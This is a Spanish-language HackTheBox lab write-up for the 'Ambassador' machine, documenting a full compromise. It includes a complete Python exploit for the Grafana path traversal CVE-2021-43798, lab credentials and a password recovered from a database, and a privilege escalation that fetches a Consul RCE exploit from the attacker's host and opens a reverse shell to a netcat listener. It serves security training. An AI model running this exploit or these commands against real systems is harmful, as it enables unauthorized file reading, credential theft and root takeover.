---
icon: linux
tags:
  - cve-2021-43798
  - directory-traversal
  - arbitrary-file-read
  - github
  - consul
---

# Ambassador

## Resumen

### Detalles

| Campo                 | Detalle       |
| --------------------- | ------------- |
| **Nombre**            | Ambassador    |
| **Sistema Operativo** | Linux         |
| **Plataforma**        | HackTheBox    |
| **Fecha**             | 05/11/2026    |
| **IP Objetivo**       | 10.129.228.56 |

### Executive Summary

Tras el escaneo de puertos se identificaron los servicios SSH, un Apache con un Hugo estático, Grafana en el 3000 y MySQL en el 3306. La versión de Grafana era la 8.2.0, vulnerable a **CVE-2021-43798**, un path traversal sin autenticación que permitía leer archivos del sistema. Se preparó un script para leer `grafana.db`, que se abrió con sqlitebrowser y en el que se encontraron expuestas las credenciales de MySQL.

Las credenciales eran válidas, por lo que se procedió a conectarse a MySQL y a inspeccionar la base de datos `whackywidget`, que contenía una tabla `users`. Se ejecutó una consulta sobre dicha tabla y se observaron las credenciales del usuario `developer`. Tras decodificarlas —estaban en Base64— se accedió por SSH, obteniendo la flag de usuario.

Para la escalada de privilegios se revisó el repositorio Git ubicado en `/opt/my-app`, donde un commit antiguo exponía un token de Consul. El servicio Consul v1.13.2 corría en localhost:8500 (no expuesto) y era vulnerable, lo que permitía RCE. Se lanzó el exploit contra el puerto local y se obtuvo ejecución como **root**, junto con su flag correspondiente.

### Técnicas

* **Information Leakage**
* **Grafana v8.2.0 Exploitation** (CVE-2021-43798) - Unauthorized Arbitrary File Read Vulnerability
* **Github Project Enumeration**
* **Hashicorp Consul v1.13.2 Exploitation** (Privilege Escalation)

## Information Gathering

### Port Scanning

#### TCP

```bash
> sudo nmap -sS -p- -Pn -n -vv --min-rate 5000 10.129.228.56 -oG allPorts
> nmap -sCV -Pn -n -v -p22,80,3000,3306 10.129.228.56 -oG allServices
```

```
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 29:dd:8e:d7:17:1e:8e:30:90:87:3c:c6:51:00:7c:75 (RSA)
|   256 80:a4:c5:2e:9a:b1:ec:da:27:64:39:a4:08:97:3b:ef (ECDSA)
|_  256 f5:90:ba:7d:ed:55:cb:70:07:f2:bb:c8:91:93:1b:f6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Ambassador Development Server
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-generator: Hugo 0.94.2
|_http-server-header: Apache/2.4.41 (Ubuntu)
3000/tcp open  http    Grafana http
| http-robots.txt: 1 disallowed entry 
|_/
|_http-favicon: Unknown favicon MD5: 279F94A1965D11699C4E33714AE33492
| http-title: Grafana
|_Requested resource was /login
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-trane-info: Problem with XML parsing of /evox/about
3306/tcp open  mysql   MySQL 8.0.30-0ubuntu0.20.04.2
| ssl-cert: Subject: commonName=MySQL_Server_8.0.28_Auto_Generated_Server_Certificate
| Issuer: commonName=MySQL_Server_8.0.28_Auto_Generated_CA_Certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-03-13T22:27:05
| Not valid after:  2032-03-10T22:27:05
| MD5:   add1:0a46:7692:932b:c703:ffea:c49b:63b0
|_SHA-1: da31:03a2:1f92:d0be:b27b:d285:b7d6:5a87:c25f:e433
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.30-0ubuntu0.20.04.2
|   Thread ID: 12
|   Capabilities flags: 65535
|   Some Capabilities: LongColumnFlag, ConnectWithDatabase, Support41Auth, SupportsLoadDataLocal, IgnoreSigpipes, SupportsCompression, SupportsTransactions, Speaks41ProtocolOld, SwitchToSSLAfterHandshake, FoundRows, InteractiveClient, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, LongPassword, DontAllowDatabaseTableColumn, ODBCClient, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: \x01>\9x#Q\x01~|B"?\x15)[70[7
|_  Auth Plugin Name: caching_sha2_password
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

| Puerto   | Servicio | Versión                                                      | Notas |
| -------- | -------- | ------------------------------------------------------------ | ----- |
| 22/tcp   | ssh      | OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) |       |
| 80/tcp   | http     | Apache httpd 2.4.41 ((Ubuntu))                               |       |
| 3000/tcp | http     | Grafana http                                                 |       |
| 3306/tcp | mysql    | MySQL 8.0.30-0ubuntu0.20.04.2                                |       |

## Explotación

### Foothold

Se comprobó la versión de Grafana y se buscaron vulnerabilidades conocidas (La versión era v8.2.0)

```bash
> searchsploit "Grafana"
```

```
Grafana 7.0.1 - Denial of Service (PoC)
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read
Grafana <=6.2.4 - HTML Injection           
```

* **Vulnerabilidad:** Directory Traversal and Arbitrary File Read (CVE-2021-43798) + Information Leakage
* **Exploit:** Script propio basado en el [exploit original](https://www.exploit-db.com/exploits/50581) para este caso completo.

```python
#!/bin/python3
import os, requests, sys
import urllib.parse

results_path = "output_files/"
os.makedirs(results_path, exist_ok=True)

def get_file(path: str, host, protocol: str = "http"):
    if not path.startswith("/"):
        path = "/" + path
    formatted_path = path.replace("/", "_")[1:]

    save_path = results_path + formatted_path
    encoded_path = urllib.parse.quote(path, safe='')
    req_url = f"{protocol}://{host}/public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f.." + encoded_path

    req_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36"}

    try:
        response = requests.get(req_url, headers=req_headers, verify=False, allow_redirects=False, timeout=15)

        if response.status_code == 200:
            with open(save_path, "wb") as output_file:
                output_file.write(response.content)
            print(f"[SUCCESS] The file {path} is downloaded in {results_path}/{formatted_path}")
        else:
            print(f"[FAIL] File not found or not accessible (HTTP {response.status_code})")

    except requests.exceptions.RequestException as error:
        print(f"[ERROR] {error}")


if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <host> <path> [path ...] [-p http|https]")
        sys.exit(1)

    host = sys.argv[1]
    protocol = "http"
    paths = []

    i = 2
    while i < len(sys.argv):
        if sys.argv[i] in ("-p", "--protocol"):
            if i + 1 >= len(sys.argv) or sys.argv[i + 1] not in ("http", "https"):
                print("Protocol must be http or https")
                sys.exit(1)
            protocol = sys.argv[i + 1]
            i += 2
        else:
            paths.append(sys.argv[i])
            i += 1

    for path in paths:
        get_file(path, host, protocol)

```

* **Procedimiento:**

1. Se descarga `grafana.db`

```bash
> python3 CVE-2021-43798.py 10.129.228.56:3000 /var/lib/grafana/grafana.db 
```

2. Se exportan las tablas en formato csv

```bash
> sqlitebrowser output_files/var_lib_grafana_grafana.db
```

`File > Export > Select all tables`&#x20;

<figure><img src="../../../.gitbook/assets/unknown (20).png" alt="" width="558"><figcaption></figcaption></figure>

Se exponen los credenciales de **MySQL**

3. Conexión MySQL y inspección de contenido

```bash
> mysql -u grafana -pdontStandSoCloseToMe63221! -h 10.129.228.56 --ssl-verify-server-cert=false
```

```sql
mysql> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| grafana            |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| whackywidget       |
+--------------------+
mysql> USE whackywidget;
mysql> SHOW TABLES;
+------------------------+
| Tables_in_whackywidget |
+------------------------+
| users                  |
+------------------------+
mysql> SELECT * FROM users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
```

Se expone la contraseña del usuario `developer` en base64. Credencial decodificado: `anEnglishManInNewYork027468`

4. Conexión SSH

```bash
# Fuerza xterm-256color para evitar problemas de compatibilidad con Kitty en sesiones SSH remotas.
TERM=xterm-256color ssh developer@10.129.228.56
> Password: anEnglishManInNewYork027468
```

* **Evidencia:** (`user.txt`)

&#x20;![](<../../../.gitbook/assets/unknown (21).png>)

### Privesc

Se descubrió que en el directorio `/opt/my-app` había un proyecto de git. Al hacer `git show` se expuso un token de Consul gracias al commit de modificación de un script.

La versión de Consul era 1.13.2

Se buscaron vulnerabilidades y se encontró una vulnerabilidad que afectaba a la versión 1.0 de Consul, igualmente, se probó el exploit a pesar de que la versión afectada era levemente inferior a la que se detectó en el sistema

```bash
> serchsploit "consul"
Hashicorp Consul v1.0 - Remote Command Execution (RCE)
```

Se detectó también en que puerto corría el servicio de Consul (De manera local ya que no estaba expuesto) - Corría en el puerto 8500.

* **Vulnerabilidad:** Hashicorp Consul v1.0 - Remote Command Execution (RCE)
* **Exploit:** https://www.exploit-db.com/exploits/51117
* **Procedimiento:**

1. Se preparó el exploit y se despliega un servidor HTTP para descargar en la máquina victima ya que el puerto de Consul no era accesible externamente. Además, se pone el puerto 4444 en escucha.

```bash
> cp /usr/share/exploitdb/exploits/multiple/remote/51117.txt consul_exploit.py
> python3 -m http.server 9940
```

```bash
> netcat -lvnp 4444
```

2. Se descarga y ejecuta el exploit

```bash
> curl http://10.10.14.108:9940/consul_exploit.py -o consul_exploit.py
> python3 consul_exploit.py 127.0.0.1 8500 10.10.14.108 4444 bb03b43b-1d81-d62b-24b5-39540ee469b5
```

* **Evidencia:** (root.txt)

![](<../../../.gitbook/assets/unknown (22).png>)
